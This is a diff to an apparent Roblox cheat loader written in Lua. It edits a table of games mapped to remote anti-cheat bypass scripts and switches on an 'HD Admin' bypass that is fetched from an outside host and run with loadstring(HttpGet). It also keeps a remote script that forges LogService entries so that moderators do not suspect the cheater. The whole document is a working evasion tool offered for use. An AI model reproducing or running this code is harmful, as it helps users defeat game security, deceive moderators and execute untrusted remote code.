@@ -28,11 +28,12 @@ local bgames = {
         PlaceIDs = {301549746},
         ScriptToRun = "https://raw.githubusercontent.com/Input50/Something/master/AC%20Bypass/Games/CounterBlox.lua"
     },
-    [6] = {
+--[[     [6] = {
         Name = "Eden Orphan's Home",
         PlaceIDs = {4786930269},
         ScriptToRun = "https://raw.githubusercontent.com/Input50/Something/master/AC%20Bypass/Games/Eden%20Orphan%20Home.lua"
-    },
+    } ]]
+    ,
     [7] = {
         Name = "Isle",
         PlaceIDs = {3095204897},
@@ -69,7 +70,7 @@ local bgames = {
         ScriptToRun = 'https://raw.githubusercontent.com/Input50/Something/master/AC%20Bypass/Games/Berkeley%20County%2C%20Concord.lua'
     },
     [15] = {
-        Name = "Prison Life Remastered",
+        Name = "CS Prison Life",
         PlaceIDs = {8278412720},
         ScriptToRun = 'https://raw.githubusercontent.com/Input50/Something/master/AC%20Bypass/Games/Prison%20life%20Remastered.lua'
     }
@@ -88,9 +89,10 @@ end
 --[[ Its detected and needs updating sadly
     getgenv()["AntiCheatSettings"] = {};
     getgenv()["AntiCheatSettings"]["Adonis"] = true;
+]]
+    getgenv()["AntiCheatSettings"] = {};
     getgenv()["AntiCheatSettings"]["HD Admin"] = true;
     loadstring(game:HttpGet("https://api.irisapp.ca/Scripts/Bypasses.lua"))()
-]]
 
 -- This just replaces the log entries in LogService with believeable ones so moderators don't suspect you when looking at them.
 loadstring(game:HttpGet(("https://raw.githubusercontent.com/Input50/Something/master/Misc/Logs.lua"),true))()
